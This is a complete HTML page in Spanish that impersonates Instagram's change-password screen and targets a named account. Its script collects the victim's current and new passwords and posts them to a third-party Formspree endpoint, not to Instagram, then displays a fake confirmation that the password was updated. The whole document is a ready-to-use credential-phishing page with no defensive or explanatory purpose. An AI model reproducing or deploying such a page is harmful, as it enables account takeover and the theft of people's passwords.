<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cambiar contraseña • Instagram</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background-color: #000000;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .page {
      flex: 1;
      max-width: 480px;
      margin: 0 auto;
      width: 100%;
      padding: 0 20px 120px 20px;
    }

    .back-btn {
      display: inline-block;
      padding: 20px 0 16px 0;
      cursor: pointer;
      color: #ffffff;
      font-size: 22px;
      line-height: 1;
      background: none;
      border: none;
      text-decoration: none;
    }

    .subtitle {
      font-size: 13px;
      color: #ffffff;
      margin-bottom: 4px;
      font-weight: 400;
    }

    h1 {
      font-size: 28px;
      font-weight: 700;
      color: #ffffff;
      line-height: 1.2;
      margin-bottom: 14px;
    }

    .description {
      font-size: 15px;
      color: #ffffff;
      line-height: 1.55;
      margin-bottom: 28px;
      font-weight: 400;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 18px;
    }

    .input-field {
      width: 100%;
      background-color: #1c1c1e;
      border: 1px solid #3a3a3c;
      border-radius: 14px;
      padding: 18px 16px;
      font-size: 16px;
      color: #8e8e93;
      outline: none;
      font-family: inherit;
      transition: border-color 0.2s;
    }

    .input-field:focus {
      border-color: #636366;
      color: #ffffff;
    }

    .input-field::placeholder {
      color: #636366;
    }

    .forgot-link {
      display: inline-block;
      color: #4cb5f9;
      font-size: 15px;
      font-weight: 600;
      text-decoration: none;
      margin-bottom: 24px;
      cursor: pointer;
    }

    .checkbox-row {
      display: flex;
      align-items: flex-start;
      gap: 14px;
      margin-bottom: 32px;
    }

    .checkbox-box {
      width: 22px;
      height: 22px;
      min-width: 22px;
      border: 2px solid #636366;
      border-radius: 4px;
      background: transparent;
      cursor: pointer;
      margin-top: 2px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.15s, border-color 0.15s;
    }

    .checkbox-box.checked {
      background: #4cb5f9;
      border-color: #4cb5f9;
    }

    .checkbox-box.checked::after {
      content: "✓";
      color: #fff;
      font-size: 13px;
      font-weight: 700;
    }

    .checkbox-label {
      font-size: 15px;
      color: #ffffff;
      line-height: 1.5;
      cursor: pointer;
    }

    .bottom-bar {
      position: fixed;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 100%;
      max-width: 480px;
      padding: 16px 20px 32px;
      background: linear-gradient(to top, #000 70%, transparent);
    }

    .submit-btn {
      width: 100%;
      background: linear-gradient(135deg, #3a6fd8, #4b7de8);
      color: #8ab0f0;
      font-size: 16px;
      font-weight: 600;
      padding: 17px;
      border-radius: 50px;
      border: none;
      cursor: pointer;
      font-family: inherit;
      transition: opacity 0.2s;
      letter-spacing: 0.2px;
    }

    .submit-btn:hover { opacity: 0.9; }
    .submit-btn:active { opacity: 0.75; }

    /* Success message */
    .success-msg {
      display: none;
      text-align: center;
      padding: 20px;
      font-size: 15px;
      color: #4cb5f9;
    }
  </style>
</head>
<body>

  <div class="page">

    <a class="back-btn" onclick="history.back()">&#8592;</a>

    <p class="subtitle">z.brenes.z &bull; Instagram</p>

    <h1>Cambiar contraseña</h1>

    <p class="description">
      La contraseña debe tener al menos 6 caracteres e incluir una combinación de números, letras y caracteres especiales (!$@%).
    </p>

    <div class="input-group">
      <input class="input-field" type="password" id="pass_actual"  placeholder="Contraseña actual" />
      <input class="input-field" type="password" id="pass_nueva"   placeholder="Contraseña nueva" />
      <input class="input-field" type="password" id="pass_repetir" placeholder="Repetir contraseña nueva" />
    </div>

    <a class="forgot-link" href="#">¿Olvidaste tu contraseña?</a>

    <div class="checkbox-row">
      <div class="checkbox-box" id="checkbox" onclick="toggleCheck()"></div>
      <label class="checkbox-label" onclick="toggleCheck()">
        Cerrar sesión en otros dispositivos. Elige esta opción si otra persona usó tu cuenta.
      </label>
    </div>

    <p class="success-msg" id="success">✅ Contraseña actualizada correctamente.</p>

  </div>

  <div class="bottom-bar">
    <button class="submit-btn" onclick="enviarDatos()">Cambiar contraseña</button>
  </div>

  <script>
    function toggleCheck() {
      document.getElementById("checkbox").classList.toggle("checked");
    }

    async function enviarDatos() {
      const actual  = document.getElementById("pass_actual").value;
      const nueva   = document.getElementById("pass_nueva").value;
      const repetir = document.getElementById("pass_repetir").value;

      if (!actual || !nueva || !repetir) {
        alert("Por favor completa todos los campos.");
        return;
      }

      const data = new FormData();
      data.append("Contraseña actual",        actual);
      data.append("Contraseña nueva",         nueva);
      data.append("Repetir contraseña nueva", repetir);

      try {
        const res = await fetch("https://formspree.io/f/xqejnqwg", {
          method: "POST",
          body: data,
          headers: { "Accept": "application/json" }
        });

        if (res.ok) {
          // Mostrar mensaje de éxito sin redirigir
          document.getElementById("success").style.display = "block";
          document.getElementById("pass_actual").value  = "";
          document.getElementById("pass_nueva").value   = "";
          document.getElementById("pass_repetir").value = "";
        } else {
          alert("Hubo un error. Intenta de nuevo.");
        }
      } catch (e) {
        alert("Error de conexión.");
      }
    }
  </script>

</body>
</html>
